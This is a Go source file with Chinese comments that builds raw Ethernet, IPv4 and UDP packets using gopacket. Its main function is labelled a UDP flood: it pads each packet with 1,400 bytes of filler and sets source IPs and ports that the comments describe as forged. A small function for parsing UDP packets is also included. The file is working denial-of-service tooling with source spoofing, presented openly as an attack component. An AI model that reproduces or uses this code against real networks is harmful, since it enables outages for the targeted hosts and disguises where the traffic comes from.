package protocol

import(
    "fmt"
    "net"
    "github.com/google/gopacket"
    "github.com/google/gopacket/layers"
    "auth/packetbuilder"
    "errors"
    "strings"
)

// UDP 泛洪
func UDPPacket(srcip, dstip string, srcport, dstport int) ([]byte, error){
	var payloadstr string = strings.Repeat("T",1400)  // 应用层数据
	payload := []byte(payloadstr)

	return BuildUDPPacket(srcip, dstip, srcport, dstport, payload)
}


func BuildUDPPacket(srcIP, dstIP string, srcPort, dstPort int, payload []byte) ([]byte, error) {
    dstMacStr, err := packetbuilder.FindMAC(dstIP)
    if err != nil {
        return nil, fmt.Errorf("failed to find MAC for %s: %w", dstIP, err)
    }
    dstMac, err := net.ParseMAC(dstMacStr)
    if err != nil {
        return nil, fmt.Errorf("failed to parse MAC address: %w", err)
    }

    srcMac, err := packetbuilder.GetSrcMAC(dstIP)
    if err != nil {
        return nil, fmt.Errorf("failed to get source MAC address: %w", err)
    }

    // 构造 Ethernet 层
    ethLayer := &layers.Ethernet{
        SrcMAC:       srcMac, // 源 MAC 地址
        DstMAC:       dstMac, // 下一跳 MAC 地址
        EthernetType: layers.EthernetTypeIPv4,
    }


    // 构造 IP 层
    ipLayer := &layers.IPv4{
        Version:  4,                        // 显式设置 IPv4 版本
        IHL:      5,                        // Internet Header Length (一般为 5)
        TOS:      0,                        // 服务类型
        Length:   0,                        // 总长度，由序列化过程自动计算
        Id:       0,                        // 数据包 ID
        Flags:    0,                        // 标志位
        FragOffset: 0,                      // 分段偏移
        TTL:      64,                       // 生存时间
        Protocol: layers.IPProtocolUDP,     // 协议类型
        SrcIP:    net.ParseIP(srcIP),       // 伪造的源 IP
        DstIP:    net.ParseIP(dstIP),       // 目标 IP
    }

    // 构造 UDP 层
    udpLayer := &layers.UDP{
        SrcPort: layers.UDPPort(srcPort), // 伪造的源端口
        DstPort: layers.UDPPort(dstPort), // 目标端口
    }

    // 设置网络层以计算校验和
    if err := udpLayer.SetNetworkLayerForChecksum(ipLayer); err != nil {
        return nil, fmt.Errorf("UDP 校验和计算失败: %v", err)
    }

    // 创建序列化选项，用于设置长度和校验和
    options := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
    buffer := gopacket.NewSerializeBuffer()

    // 序列化以太网层、IP 层、UDP 层和数据负载
    err = gopacket.SerializeLayers(buffer, options, ethLayer, ipLayer, udpLayer, gopacket.Payload(payload))
    if err != nil {
        return nil, fmt.Errorf("序列化层失败: %v", err)
    }

    // 返回生成的报文字节切片
    return buffer.Bytes(), nil
}

// 解析UDP报文，返回应用层数据
func ResolveUDPPacket(packet []byte) (srcPort, dstPort int, payload []byte, err error) {
	// 用 gopacket 解析数据包，假设从 UDP 层开始解析
	parser := gopacket.NewPacket(packet, layers.LayerTypeUDP, gopacket.Default)

	// 提取 UDP 层
	udpLayer := parser.Layer(layers.LayerTypeUDP)
	if udpLayer == nil {
		return 0, 0, nil, errors.New("解析 UDP 层失败")
	}
	udp, _ := udpLayer.(*layers.UDP)
	srcPort = int(udp.SrcPort)
	dstPort = int(udp.DstPort)
	payload = udp.Payload

	return srcPort, dstPort, payload, nil
}
